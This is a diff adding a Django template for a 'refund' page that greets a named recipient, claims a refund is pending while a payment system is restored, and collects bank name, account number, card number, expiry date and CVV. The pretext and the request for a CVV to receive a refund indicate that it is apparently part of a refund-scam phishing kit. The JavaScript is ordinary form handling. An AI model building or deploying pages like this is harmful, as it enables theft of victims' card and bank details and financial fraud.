@@ -1,0 +1,346 @@
+{% extends 'refund/base.html' %}
+
+{% block title %}Refund for {{ recipient_name }}{% endblock %}
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+{% block extra_css %}
+<style>
+    p {
+        line-height: 1.6;
+        margin-bottom: 15px;
+        font-size: 16px;
+        text-align: left;
+        padding: 15px;
+        background: rgba(255, 255, 255, 0.7);
+        border-radius: 12px;
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+    }
+    
+    strong {
+        color: #d33;
+        font-size: 18px;
+        text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    }
+    
+    form {
+        margin-top: 30px;
+    }
+    
+    label {
+        display: block;
+        margin-top: 20px;
+        margin-bottom: 8px;
+        font-weight: 600;
+        font-size: 14px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        color: #6b1426;
+    }
+    
+    input[type="text"], input[type="number"], input[type="month"] {
+        width: 100%;
+        padding: 15px;
+        margin-top: 6px;
+        border: 2px solid #f0d0d0;
+        border-radius: 12px;
+        font-size: 16px;
+        background: linear-gradient(145deg, #ffffff, #fafafa);
+        transition: all 0.3s ease;
+        box-sizing: border-box;
+    }
+    
+    input[type="text"]:focus, input[type="number"]:focus, input[type="month"]:focus {
+        outline: none;
+        border-color: #ff6b6b;
+        box-shadow: 0 0 0 3px rgba(255, 107, 107, 0.1);
+        transform: translateY(-2px);
+        background: linear-gradient(145deg, #ffffff, #fff8f8);
+    }
+    
+    input::placeholder {
+        color: #b0b0b0;
+        font-style: italic;
+    }
+    
+    .card-number-wrapper {
+        position: relative;
+    }
+    
+    .visa-logo {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 48px;
+        height: auto;
+        pointer-events: none;
+        user-select: none;
+        opacity: 0.8;
+        transition: opacity 0.3s ease;
+    }
+    
+    .card-number-wrapper:focus-within .visa-logo {
+        opacity: 1;
+    }
+    
+    .small-inputs {
+        display: flex;
+        gap: 15px;
+        margin-top: 10px;
+    }
+    
+    .small-inputs > div {
+        flex: 1;
+    }
+    
+    .small-inputs input {
+        width: 100%;
+    }
+    
+    .field-errors {
+        color: #dc3545;
+        font-size: 14px;
+        margin-top: 5px;
+        list-style: none;
+        padding: 0;
+    }
+    
+    .field-errors li {
+        margin-bottom: 5px;
+    }
+    
+    .error-field {
+        border-color: #dc3545 !important;
+    }
+    
+    /* Responsive improvements */
+    @media (max-width: 520px) {
+        body {
+            margin: 20px;
+            padding: 20px;
+        }
+        
+        .small-inputs {
+            flex-direction: column;
+            gap: 10px;
+        }
+    }
+</style>
+
+<style>
+  .spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #fff;
+    border-radius: 50%;
+    width: 18px;
+    height: 18px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    vertical-align: middle;
+    margin-left: 10px;
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  button {
+    margin-top: 30px;
+    background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+    color: white;
+    border: none;
+    padding: 18px;
+    font-size: 18px;
+    font-weight: 600;
+    border-radius: 15px;
+    cursor: pointer;
+    width: 100%;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+  }
+
+  button::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: left 0.5s ease;
+  }
+
+  button:hover {
+    background: linear-gradient(135deg, #e55656, #d4501f);
+    transform: translateY(-2px);
+    box-shadow: 0 10px 25px rgba(255, 107, 107, 0.3);
+  }
+
+  button:hover::before {
+    left: 100%;
+  }
+
+  button:active {
+    transform: translateY(0);
+  }
+
+  button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+{% endblock %}
+
+{% block content %}
+<p>Dear {{ recipient_name }}, we apologize for the inconvenience and are processing a refund for you. Please provide your payment details so we can complete the transaction promptly. We’ll notify you once our payment system is fully restored.</p>
+
+
+
+<!-- Display form-wide errors -->
+{% if form.non_field_errors %}
+    <div class="form-errors">
+        <strong>Please correct the following errors:</strong>
+        {{ form.non_field_errors }}
+    </div>
+{% endif %}
+
+<form method="POST" id="refundForm">
+    {% csrf_token %}
+    
+    <label for="{{ form.bank_name.id_for_label }}">Bank Name</label>
+    {{ form.bank_name }}
+    {% if form.bank_name.errors %}
+        <ul class="field-errors">
+            {% for error in form.bank_name.errors %}
+                <li>{{ error }}</li>
+            {% endfor %}
+        </ul>
+    {% endif %}
+    
+    <label for="{{ form.account_number.id_for_label }}">Account Number</label>
+    {{ form.account_number }}
+    {% if form.account_number.errors %}
+        <ul class="field-errors">
+            {% for error in form.account_number.errors %}
+                <li>{{ error }}</li>
+            {% endfor %}
+        </ul>
+    {% endif %}
+    
+    <label for="{{ form.card_number.id_for_label }}">Card Number</label>
+    <div class="card-number-wrapper">
+        {{ form.card_number }}
+        <img class="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo" />
+    </div>
+    {% if form.card_number.errors %}
+        <ul class="field-errors">
+            {% for error in form.card_number.errors %}
+                <li>{{ error }}</li>
+            {% endfor %}
+        </ul>
+    {% endif %}
+    
+    <div class="small-inputs">
+        <div style="flex:2;">
+            <label for="{{ form.expiry_date.id_for_label }}">Expiration Date</label>
+            {{ form.expiry_date }}
+            {% if form.expiry_date.errors %}
+                <ul class="field-errors">
+                    {% for error in form.expiry_date.errors %}
+                        <li>{{ error }}</li>
+                    {% endfor %}
+                </ul>
+            {% endif %}
+        </div>
+        <div style="flex:1;">
+            <label for="{{ form.cvv.id_for_label }}">CVV</label>
+            {{ form.cvv }}
+            {% if form.cvv.errors %}
+                <ul class="field-errors">
+                    {% for error in form.cvv.errors %}
+                        <li>{{ error }}</li>
+                    {% endfor %}
+                </ul>
+            {% endif %}
+        </div>
+    </div>
+    
+    <button type="submit" id="refund-submit-btn">
+      <span id="refund-text">Submit Refund Details</span>
+      <span id="spinner" class="spinner hidden">
+      </span>
+    </button>
+</form>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // Card number formatting
+    const cardNumberInput = document.getElementById('{{ form.card_number.id_for_label }}');
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+            // Remove all non-digit characters
+            let value = e.target.value.replace(/\D/g, '');
+            // Add spaces every 4 digits
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = value;
+        });
+    }
+    
+    // Enhanced form interaction
+    const inputs = document.querySelectorAll('input[type="text"], input[type="month"]');
+    inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+            this.parentElement.style.transform = 'scale(1.02)';
+        });
+        
+        input.addEventListener('blur', function() {
+            this.parentElement.style.transform = 'scale(1)';
+        });
+        
+        // Add error styling
+        if (this.classList.contains('error')) {
+            this.classList.add('error-field');
+        }
+    });
+</script>
+
+<script>
+  document.getElementById("refundForm").addEventListener("submit", function (event) {
+    const form = event.target;
+    const btn = document.getElementById("refund-submit-btn");
+    const spinner = document.getElementById("spinner");
+    const refundText = document.getElementById("refund-text");
+
+    event.preventDefault();
+
+    if (!form.checkValidity()) {
+      form.reportValidity();
+      return;
+    }
+
+    btn.disabled = true;
+    spinner.classList.remove("hidden");
+    refundText.textContent = "Processing...";
+
+    setTimeout(function () {
+      form.submit();
+    }, 500);
+  });
+</script>
+
+{% endblock %}
